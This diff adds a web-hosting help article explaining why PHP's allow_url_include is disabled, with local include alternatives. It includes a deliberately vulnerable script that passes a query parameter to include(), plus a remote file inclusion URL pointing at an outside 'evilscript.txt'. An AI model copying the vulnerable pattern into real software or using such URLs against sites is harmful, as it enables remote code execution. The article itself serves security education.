@@ -1,0 +1,103 @@
+<p>The PHP option <code>allow_url_include</code> normally allows a programmer to include() a remote file (as <a href="/hc/en-us/articles/214202188-PHP-overview">PHP</a> code) using a URL rather than a local file path. For security reasons, DreamHost has disabled this feature. If a script claims to require this feature, you should look into alternative software, as the use of this feature indicates serious design flaws.</p>
+<h2><strong><span id="Why_is_this_bad.3F">Why is this bad?</span></strong></h2>
+<p>There are a number of reasons why URL includes should always be avoided:</p>
+<ul>
+<li>It's insecure – if your application can be tricked into including content from a URL outside itself (and there are a number of common ways this can happen), an attacker can force your application to start running code from their own web site.</li>
+<li>It's inefficient – if your PHP script includes content from a URL, then the web server must make HTTP requests to generate the page. This makes your page load much slower than necessary, especially if the site you're loading content from is responding slowly.</li>
+<li>It's unreliable, for the same reasons – if the web server you are loading content from occasionally fails to respond, your web site also sometimes fails to load properly.</li>
+<li>It's usually unnecessary – in most cases, allow_url_include can be avoided either by including the content directly (if it is being loaded from a domain you host) or by loading and printing the content without evaluating it as PHP.</li>
+</ul>
+<h2><strong><span id="Server-side_includes">Server-side includes</span></strong></h2>
+<p>Many developers include files by pointing to a remote URL, even if the file is within the local system. For example:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;php include("http://example.com/includes/example_include.php"); ?&gt;</pre>
+</div>
+<p>With allow_url_include disabled, this method does not work. Instead, the file must be included with a local path, and there are three methods of doing this:</p>
+<ol>
+<li>By using a relative path, such as ../includes/example_include.php.</li>
+<li>By using an absolute path (also known as relative-from-root), such as /home/username/example.com/includes/example_include.php.</li>
+<li>By using the PHP environment variable $_SERVER['DOCUMENT_ROOT'], which returns the absolute path to the web root directory. This is by far the best (and most portable) solution. The following example shows the environment variable in action.</li>
+</ol>
+<h4><strong><span id="Example_Include" class="mw-headline">Example Include</span></strong></h4>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php include($_SERVER['DOCUMENT_ROOT']."/includes/example_include.php"); ?&gt;</pre>
+</div>
+<h2><strong><span id="Processing_differences_.28and_passing_variables_to_an_included_file.29">Processing differences (and passing variables to an included file)</span></strong></h2>
+<p>It is worth mentioning that the alternative solutions presented here result in a difference in the way the include() function is handled. The alternative solutions all return the PHP code from the included page; however, the now-unavailable remote URL method returns the result from the included page. One result of this behavior is that you cannot pass a query string using the alternative solutions. You define the variables locally before performing the include, as seen in the following example.</p>
+<h4><strong><span id="Example" class="mw-headline wysiwyg-font-size-large">Example</span></strong></h4>
+<p>To achieve the effect of this:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php include("http://example.com/includes/example_include.php?var=example"); ?&gt;</pre>
+</div>
+<p>you must instead use this:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $var = "example"; include($_SERVER['DOCUMENT_ROOT']."/includes/example_include.php"); ?&gt;</pre>
+</div>
+<h2><strong><span id="Adding_flexibility">Adding flexibility</span></strong></h2>
+<p>For maximum flexibility (when multiple includes are required, for example), it may be easier to create a variable:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $doc_root = $_SERVER['DOCUMENT_ROOT'];
+include("$doc_root/includes/example_include.php");
+include("$doc_root/includes/example_include2.php");
+include("$doc_root/includes/example_include3.php");
+include("$doc_root/includes/example_include4.php"); ?&gt;</pre>
+</div>
+<dl>
+<dd></dd>
+<dd></dd>
+</dl>
+<div class="alert alert-note">
+<div class="alert-icon"><img src="https://kbimages.objects-us-west-1.dream.io/images/dh-kb-note-icon.svg" alt="" width="60" height="60" /></div>
+<div class="alert-content">
+<p>The technique works in the same way, regardless of whether you are using include() or require().</p>
+</div>
+</div>
+<h2><strong><span id="Setting_the_include_path">Setting the include_path</span></strong></h2>
+<p>You can also explicitly set the PHP directive, "include_path", on the fly:</p>
+<div class="preboxcontainer">
+<pre class="prebox">lt;?php ini_set('include_path',
+ini_get('include_path').':'.$_SERVER['DOCUMENT_ROOT'].'/includes');
+include('example_include.php');
+include('example_include2.php');
+include('example_include3.php');
+include('example_include4.php'); ?&gt;</pre>
+</div>
+<h3><strong><span id="Example_exploitation">Example exploitation</span></strong></h3>
+<p>A common use of server-side includes is to create some sort of site template. Often, a single page with a header and a footer is fed differing content by using a query string. Here is a typical example script:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $page = ($_GET['page']) ? $_GET['page'] : "default.php"; ?&gt;
+&lt;html&gt;
+&lt;head&gt;
+e&gt;This page is easy to exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+header...
+
+&lt;?php include($page); ?&gt;
+
+footer...
+
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>
+<p>The content of the page can be varied by appending a query string to the URL:</p>
+<div class="preboxcontainer">
+<pre class="prebox">http://example.com/index.php?page=varied.php</pre>
+</div>
+<p>If allow_url_include is enabled, this system can be exploited by simply changing the value of the variable in the query string:</p>
+<div class="preboxcontainer">
+<pre class="prebox">http://example.com/index.php?page=http://websitehelp.support/evilscript.txt</pre>
+</div>
+<h2><strong><span id="Final_note">Final note</span></strong></h2>
+<p>Just say no. Enabling allow_url_include is a terrible idea that exposes your website, and the websites of others on your shared server, to unnecessary risk.</p>
+<h2><strong><span id="See_also">See also</span></strong></h2>
+<h3>Internal links</h3>
+<ul>
+<li><span class="mw-headline wysiwyg-font-size-large wysiwyg-font-size-medium"><a style="background-color: #ffffff;" href="/hc/en-us/articles/214199238-allow-url-fopen">allow_url_fopen</a></span></li>
+</ul>
+<h3>External links</h3>
+<ul>
+<li><span class="wysiwyg-font-size-medium"><a class="external text" href="http://us2.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include" rel="nofollow"><code>allow_url_include</code></a> at <a class="external text" href="http://php.net" rel="nofollow">PHP.net</a></span></li>
+<li><span class="wysiwyg-font-size-medium"><a class="external text" href="http://us2.php.net/filesystem" rel="nofollow">PHP File System Functions</a> at <a class="external text" href="http://php.net" rel="nofollow">PHP.net</a></span></li>
+</ul>
